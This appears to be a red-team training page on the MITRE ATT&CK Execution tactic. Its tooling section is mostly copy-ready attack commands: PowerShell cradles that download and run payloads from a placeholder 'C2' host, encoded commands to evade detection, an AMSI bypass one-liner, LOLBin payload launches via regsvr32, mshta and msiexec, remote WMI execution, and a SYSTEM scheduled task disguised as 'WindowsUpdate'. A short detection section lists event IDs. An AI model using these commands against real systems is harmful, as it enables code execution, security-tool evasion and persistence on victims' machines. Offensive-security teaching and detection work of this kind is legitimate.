---
layout: training-page
title: "TA0002 — Execution — Red Team Academy"
module: "MITRE ATT&CK Tactics"
tags:
  - mitre
  - att&ck
  - execution
  - powershell
  - wmi
  - lolbins
page_key: "mitre-ta0002"
render_with_liquid: false
---

# TA0002 — Execution

Execution techniques are the mechanisms adversaries use to run malicious code on a target system. After achieving initial access, execution is required to establish a C2 channel, drop tools, or execute the primary mission payload. Modern execution tradecraft emphasizes living-off-the-land binaries (LOLBins) — using built-in Windows utilities to execute code — because they blend with legitimate system activity and are harder to detect and block than dropped executables.

Execution is often paired with Defense Evasion (TA0005) since raw payload execution without evasion will trigger most modern EDRs.

## Key Techniques

| T-ID | Technique | Sub-technique | Notes |
|------|-----------|---------------|-------|
| T1059 | Command and Scripting Interpreter | T1059.001 PowerShell | Most abused interpreter — AMSI targets this |
| T1059 | Command and Scripting Interpreter | T1059.003 Windows Command Shell | cmd.exe — simple but heavily monitored |
| T1059 | Command and Scripting Interpreter | T1059.004 Unix Shell | bash/sh/zsh on Linux/macOS |
| T1059 | Command and Scripting Interpreter | T1059.005 Visual Basic | VBA macros, VBScript (wscript/cscript) |
| T1059 | Command and Scripting Interpreter | T1059.006 Python | Python payloads on multi-platform targets |
| T1059 | Command and Scripting Interpreter | T1059.007 JavaScript | JScript via wscript.exe or mshta.exe |
| T1203 | Exploitation for Client Execution | — | Browser/Office/PDF exploits trigger shellcode |
| T1106 | Native API | — | Direct Windows API calls bypass script logging |
| T1053 | Scheduled Task/Job | T1053.002 At | Legacy at.exe (deprecated but present) |
| T1053 | Scheduled Task/Job | T1053.003 Cron | Linux cron for persistent execution |
| T1053 | Scheduled Task/Job | T1053.005 Scheduled Task | schtasks.exe — common execution + persistence |
| T1072 | Software Deployment Tools | — | Abuse SCCM, PDQ, Ansible to push code |
| T1569 | System Services | T1569.002 Service Execution | sc.exe create + start; SMB service execution |
| T1204 | User Execution | T1204.001 Malicious Link | User clicks phishing URL |
| T1204 | User Execution | T1204.002 Malicious File | User opens weaponized doc/LNK/ISO |
| T1047 | Windows Management Instrumentation | — | wmic process call create — remote/local exec |
| T1220 | XSL Script Processing | — | wmic + XSL stylesheet to execute JScript |
| T1129 | Shared Modules | — | DLL loading via LoadLibrary calls |

## Red Team Tooling

### PowerShell Execution

```
# Download and execute in memory (classic, noisy)
powershell.exe -NoP -Ep Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://C2/payload.ps1')"

# Encoded command (avoids simple keyword detection)
$cmd = "IEX (New-Object Net.WebClient).DownloadString('http://C2/payload.ps1')"
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell.exe -EncodedCommand $enc

# AMSI bypass (patch AmsiScanBuffer — modern EDRs detect this)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# PowerShell without powershell.exe (using SyncAppvPublishingServer)
SyncAppvPublishingServer.exe ".; IEX(New-Object Net.WebClient).DownloadString('http://C2/p.ps1')"
```

### LOLBin Execution

```
# Regsvr32 — execute DLL or COM scriptlet (no AMSI)
regsvr32.exe /s /n /u /i:http://C2/payload.sct scrobj.dll

# Mshta — execute HTA/VBScript/JScript
mshta.exe http://C2/payload.hta
mshta.exe "javascript:a=(GetObject('script:http://C2/p.sct')).Exec();close();"

# Rundll32 — execute exported DLL function
rundll32.exe C:\Windows\Temp\evil.dll,Export

# Certutil — decode and execute (commonly blocked by MDAV)
certutil.exe -decode payload.b64 payload.exe && payload.exe

# Msiexec — install MSI payload
msiexec.exe /q /i http://C2/payload.msi

# InstallUtil — AppDomain unhandled exception execute
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /u payload.exe

# Forfiles — indirect cmd execution
forfiles /p c:\windows\system32 /m notepad.exe /c "powershell.exe -c IEX(..."
```

### WMI Execution

```
# Local WMI process creation
wmic process call create "powershell.exe -c IEX(...)"

# Remote WMI execution (requires admin creds)
wmic /node:TARGET_IP /user:DOMAIN\user /password:pass process call create "powershell.exe -c ..."

# PowerShell WMI (Invoke-WmiMethod)
Invoke-WmiMethod -ComputerName TARGET -Class Win32_Process -Name Create \
  -ArgumentList "cmd.exe /c whoami > C:\out.txt"

# WMI permanent event subscription (execution + persistence)
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = 'trigger'; EventNamespace = 'root\cimv2';
    QueryLanguage = 'WQL'; Query = "SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second = 0"
}
# (combine with CommandLineEventConsumer)
```

### Scheduled Tasks

```
# Create scheduled task to execute payload
schtasks /create /tn "WindowsUpdate" /tr "powershell.exe -ep bypass -c IEX(...)" \
  /sc ONLOGON /ru SYSTEM /f

# Immediate execution via scheduled task
schtasks /create /tn "tmprun" /tr "C:\Windows\Temp\payload.exe" /sc ONCE \
  /st 00:00 /f && schtasks /run /tn "tmprun"

# Remote scheduled task (Impacket atexec)
python3 atexec.py DOMAIN/user:pass@TARGET "whoami"
```

## Detection Notes

- **PowerShell**: ScriptBlock logging (Event ID 4104) captures decoded commands — this is your best detection source; AMSI events 8002/8010 for blocked scripts
- **WMI**: Event ID 5857/5858/5860/5861 in Microsoft-Windows-WMI-Activity/Operational; Sysmon Event 20/21 for WMI filter/consumer creation
- **Scheduled tasks**: Event IDs 4698 (task created) and 4702 (task updated); Sysmon Event 1 for spawned child process
- **LOLBins**: Sysmon Event 1 (process creation) — watch for regsvr32, mshta, rundll32, certutil spawning network connections or child processes
- **Office macros**: child processes of WINWORD.EXE, EXCEL.EXE, POWERPNT.EXE — near-universal detection rule; macro execution logging via OTTM/OALM

## Related Academy Pages

- [AMSI Bypass](/evasion/amsi-bypass/)
- [PowerShell Obfuscation](/evasion/powershell-obfuscation/)
- [WMI Lateral Movement](/post-exploitation/wmi-lateral/)
- [LOLBins & LOLBAS](/evasion/lolbins/)
- [LOLBAS Full Reference](/evasion/lolbas-reference/)
- [Shellcoding](/exploitation/shellcoding/)
- [PowerShell Without powershell.exe](/evasion/powershell-without-ps/)

## Resources

- [TA0002 — MITRE ATT&CK Execution](https://attack.mitre.org/tactics/TA0002/)
- [T1059 — Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
- [T1047 — WMI](https://attack.mitre.org/techniques/T1047/)
- [LOLBAS Project](https://lolbas-project.github.io)
